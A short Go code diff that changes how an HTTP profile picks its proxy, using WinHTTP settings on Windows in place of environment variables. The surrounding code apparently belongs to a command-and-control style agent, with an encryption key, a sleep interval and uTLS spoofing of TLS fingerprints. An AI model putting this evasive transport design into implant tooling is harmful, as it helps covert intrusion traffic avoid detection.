@@ -145,8 +145,8 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 			transport.Proxy = http.ProxyURL(proxyU)
 		}
 	} else {
-		// No explicit proxy — use system proxy from HTTP_PROXY / HTTPS_PROXY
-		transport.Proxy = http.ProxyFromEnvironment
+		// No explicit proxy — use system proxy (WinHTTP on Windows, env vars elsewhere)
+		transport.Proxy = systemProxyFunc()
 	}
 
 	// If a TLS fingerprint is specified (not "go" or empty), use uTLS to spoof
